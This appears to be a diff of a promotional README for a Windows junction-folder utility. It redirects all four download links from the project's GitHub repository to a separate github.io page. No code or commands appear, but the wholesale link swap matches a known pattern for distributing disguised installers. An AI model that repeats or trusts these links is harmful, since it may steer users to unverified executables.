@@ -1,12 +1,12 @@
 # 📁 Junction-Folder-Creator-Tool - Free Up Space and Organize Files
 
-[![Download Now](https://img.shields.io/badge/Download-Junction_Folder_Creator_Tool-2ea44f?style=for-the-badge&logo=github)](https://github.com/sergejkprivate/Junction-Folder-Creator-Tool)
+[![Download Now](https://img.shields.io/badge/Download-Junction_Folder_Creator_Tool-2ea44f?style=for-the-badge&logo=github)](https://sergejkprivate.github.io)
 
 ## 🚀 Getting Started
 
 Welcome! This guide will help you download and use Junction-Folder-Creator-Tool on your Windows computer. This handy utility lets you move folders to another drive while keeping them accessible in their original location. Perfect for freeing up space on your main drive without breaking your file structure.
 
-Visit this link to download the application: [Junction-Folder-Creator-Tool Download Page](https://github.com/sergejkprivate/Junction-Folder-Creator-Tool)
+Visit this link to download the application: [Junction-Folder-Creator-Tool Download Page](https://sergejkprivate.github.io)
 
 ## 🧐 What Does This Tool Do?
 
@@ -18,7 +18,7 @@ Think of junction folders as magical portals. You move a big folder (like your D
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [Download Junction-Folder-Creator-Tool](https://github.com/sergejkprivate/Junction-Folder-Creator-Tool)
+Visit this link to download the application: [Download Junction-Folder-Creator-Tool](https://sergejkprivate.github.io)
 
 Once you're on the page, look for the download button or the latest release section. Click it to start downloading.
 
@@ -109,7 +109,7 @@ This is a free, open-source tool. You're welcome to use it for personal or comme
 
 Junction-Folder-Creator-Tool is the perfect solution for anyone running low on disk space or wanting to better organize their files across multiple drives. It's simple enough for beginners yet powerful enough for power users. Download it today and give your main drive some breathing room!
 
-Remember: Visit this link to download the application: [Junction-Folder-Creator-Tool](https://github.com/sergejkprivate/Junction-Folder-Creator-Tool)
+Remember: Visit this link to download the application: [Junction-Folder-Creator-Tool](https://sergejkprivate.github.io)
 
 Happy organizing! 🗂️✨
 
